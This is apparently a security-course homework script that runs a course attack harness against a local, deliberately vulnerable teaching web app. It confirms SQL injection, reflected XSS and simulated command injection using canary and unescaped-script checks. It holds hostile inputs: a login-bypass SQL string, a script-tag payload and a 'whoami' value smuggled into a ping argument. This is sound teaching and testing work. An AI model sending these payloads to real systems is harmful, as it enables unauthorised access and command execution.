"""Part A: run the course seclab.attack harness against vuln-web.

Run from the course repository root after starting vuln-web:
    python homework/hw2/luna/attack/confirm_template.py \
        --base-url http://127.0.0.1:8000 --trials 3

IMPORTANT: this source version contains no Medium filter. The script confirms
baseline effects with the official seclab.attack API; it does NOT claim that a
Medium filter was bypassed. The Medium-filter requirement must be supplied by
an actual filter layer (or DVWA Medium) and tested separately.
"""
from __future__ import annotations

import argparse
import json
import sys
from pathlib import Path
from urllib.error import HTTPError, URLError
from urllib.parse import quote
from urllib.request import Request, urlopen


def find_course_root(start: Path) -> Path:
    for candidate in (start, *start.parents):
        if (candidate / "seclab" / "attack.py").is_file():
            return candidate
    raise RuntimeError(
        "Could not locate seclab/attack.py. Place this folder under "
        "homework/hw2/<group>/ in the course repository and run from there."
    )


HERE = Path(__file__).resolve().parent
COURSE_ROOT = find_course_root(HERE)
sys.path.insert(0, str(COURSE_ROOT))

from seclab.attack import Payload, run_payloads, contains_oracle  # noqa: E402

PAYLOAD_SQLI = "admin' OR '1'='1"
PAYLOAD_XSS = "<script>alert(1)</script>"
PAYLOAD_CMDI = "127.0.0.1; whoami"
CANARY_SECRET = "FLAG-sqli-9f2c-admin-session"


def request_text(url: str, *, data: dict | None = None) -> str:
    if data is None:
        req = Request(url, method="GET")
    else:
        req = Request(
            url,
            data=json.dumps(data).encode("utf-8"),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
    try:
        with urlopen(req, timeout=5) as response:
            return response.read().decode("utf-8", errors="replace")
    except HTTPError as exc:
        # Preserve the response body for the oracle, including a 4xx/5xx body.
        return exc.read().decode("utf-8", errors="replace")


def xss_unescaped_script_oracle(payload: Payload, response: str) -> tuple[bool, str]:
    """Assignment oracle: literal <script> is present and not HTML-encoded."""
    body = response if isinstance(response, str) else str(response)
    hit = "<script>" in body.lower() and "&lt;script&gt;" not in body.lower()
    evidence = "literal unescaped <script> element returned" if hit else "no unescaped <script> element"
    return hit, evidence


def cmdi_simulation_oracle(payload: Payload, response: str) -> tuple[bool, str]:
    """The lab oracle is simulated: it detects a metacharacter in command context."""
    try:
        obj = json.loads(response)
    except (TypeError, json.JSONDecodeError):
        return False, "response was not the expected JSON object"
    hit = obj.get("injection_detected") is True
    evidence = (
        f"simulated shell metacharacter effect; would_run={obj.get('would_run')!r}"
        if hit else "the application did not flag a command-context metacharacter"
    )
    return hit, evidence


def serialize_finding(label: str, finding, raw_response: str, oracle_name: str) -> dict:
    return {
        "class": label,
        "location": {"sqli": "do_login", "xss": "do_reflect", "cmdi": "do_ping"}[label],
        "owasp_2021": "A03:2021 Injection",
        "payload": finding.payload.text,
        "oracle": oracle_name,
        "confirmed": finding.confirmed,
        "successes": finding.successes,
        "trials": finding.trials,
        "reliability": finding.reliability,
        "elapsed_seconds": finding.elapsed,
        "evidence": finding.evidence,
        "error": finding.error,
        "raw_response_last_trial": raw_response,
        "filter_level": "not evidenced in supplied vuln-web source",
        "medium_bypass_confirmed": False,
    }


def run(base: str, trials: int = 1) -> list[dict]:
    base = base.rstrip("/")
    results: list[dict] = []

    # SQLi: the canary, not a changed response, is the security-relevant oracle.
    last = {"body": ""}
    sqli = Payload(
        PAYLOAD_SQLI,
        intent="bypass the login predicate and disclose the seeded admin canary",
        family="sqli",
    )

    def send_sqli(text: str) -> str:
        last["body"] = request_text(base + "/login", data={"user": text, "pw": "x"})
        return last["body"]

    f = run_payloads(
        [sqli], send=send_sqli, oracle=contains_oracle(CANARY_SECRET),
        trials=trials, progress=True,
    )[0]
    results.append(serialize_finding(
        "sqli", f, last["body"], "exact seeded canary appears in response (seclab.attack)",
    ))

    # XSS: per the assignment, the oracle requires an unescaped script element.
    last["body"] = ""
    xss = Payload(
        PAYLOAD_XSS,
        intent="inject a script element into the reflected HTML response",
        family="xss",
    )

    def send_xss(text: str) -> str:
        last["body"] = request_text(base + "/?name=" + quote(text, safe=""))
        return last["body"]

    f = run_payloads(
        [xss], send=send_xss, oracle=xss_unescaped_script_oracle,
        trials=trials, progress=True,
    )[0]
    results.append(serialize_finding(
        "xss", f, last["body"], "literal, unescaped <script> in response (seclab.attack)",
    ))

    # CMDi: vuln-web explicitly simulates shell interpretation; it never starts a shell.
    last["body"] = ""
    cmdi = Payload(
        PAYLOAD_CMDI,
        intent="place a shell metacharacter and a second command in the ping argument",
        family="cmdi",
        note="The supplied teaching target simulates the command-context effect.",
    )

    def send_cmdi(text: str) -> str:
        last["body"] = request_text(base + "/ping", data={"host": text})
        return last["body"]

    f = run_payloads(
        [cmdi], send=send_cmdi, oracle=cmdi_simulation_oracle,
        trials=trials, progress=True,
    )[0]
    results.append(serialize_finding(
        "cmdi", f, last["body"], "injection_detected=true in the lab's simulated command context (seclab.attack)",
    ))
    results[-1]["execution_note"] = (
        "This target reports what would run; it does not execute whoami or launch a shell."
    )
    return results


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--base-url", default="http://127.0.0.1:8000")
    parser.add_argument("--trials", type=int, default=1)
    parser.add_argument(
        "--out", default=str(HERE / "part_a_results.json"),
        help="JSON output path (default: attack/part_a_results.json)",
    )
    args = parser.parse_args()
    if args.trials < 1:
        parser.error("--trials must be >= 1")

    try:
        results = run(args.base_url, trials=args.trials)
    except (URLError, TimeoutError, OSError) as exc:
        raise SystemExit(
            f"Could not reach {args.base_url}: {exc}. Start vuln-web first."
        ) from exc

    out = Path(args.out)
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_text(json.dumps(results, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    print(json.dumps(results, ensure_ascii=False, indent=2))
    print(f"\nSaved: {out}")
    if not all(item["confirmed"] for item in results):
        return 1
    print(
        "All three baseline oracles confirmed through seclab.attack. "
        "No Medium-filter bypass is claimed because no such filter is present "
        "in the supplied vuln-web files."
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
